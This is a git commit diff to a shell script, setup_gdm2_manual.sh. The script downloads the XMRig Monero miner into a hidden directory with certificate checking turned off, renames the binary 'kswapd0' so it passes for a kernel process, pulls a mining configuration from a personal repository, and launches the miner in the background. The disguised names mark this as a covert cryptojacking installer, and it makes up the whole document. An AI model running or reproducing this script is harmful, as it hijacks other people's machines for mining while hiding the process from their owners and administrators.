fcd4809cf08ded4ef512927f8fc781539a532440
Acen <113854209+littlAcen@users.noreply.github.com>
2024-06-01 08:52:58 +0200

    Update setup_gdm2_manual.sh

--- setup_gdm2_manual.sh
+++ setup_gdm2_manual.sh
@@ -1,12 +1,18 @@
 mkdir $HOME/.gdm2_manual/
 cd $HOME/.gdm2_manual/
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
-tar xf $HOME/.gdm2_manual/xmrig.tar.gz
+wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz ; tar xzvf xmrig.tar.gz
+mv xmrig kswapd0
+rm -rf config.json
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+curl -O https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+./kswapd0&
+
+#tar xf $HOME/.gdm2_manual/xmrig.tar.gz
 #rm $HOME/.gdm2_manual/xmrig.tar.gz
-mv $HOME/.gdm2_manual/xmrig $HOME/.gdm2_manual/kswapd0
+#mv $HOME/.gdm2_manual/xmrig $HOME/.gdm2_manual/kswapd0
+#rm -rf $HOME/.gdm2_manual/config.json
 
-rm -rf $HOME/.gdm2_manual/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2_manual/config.json
+#wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2_manual/config.json
 
-$HOME/.gdm2_manual/kswapd0 &
+#$HOME/.gdm2_manual/kswapd0 &
